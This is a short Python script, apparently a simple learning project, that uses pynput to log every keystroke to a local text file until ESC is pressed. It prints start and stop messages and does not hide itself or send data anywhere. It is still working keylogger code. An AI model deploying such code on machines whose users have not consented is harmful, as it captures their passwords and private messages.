from pynput import keyboard
import os

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.txt")

# Ensure logs folder exists
os.makedirs(LOG_DIR, exist_ok=True)

def on_press(key):
    # STOP the keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        print("\n🛑 ESC pressed — Keylogger stopped.")
        return False   # <-- THIS STOPS THE LISTENER

    with open(LOG_FILE, "a") as log:
        try:
            log.write(key.char)
        except AttributeError:
            log.write(f"[{key}]")

def main():
    print("🎯 Keylogger started. Press ESC to stop.\n")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
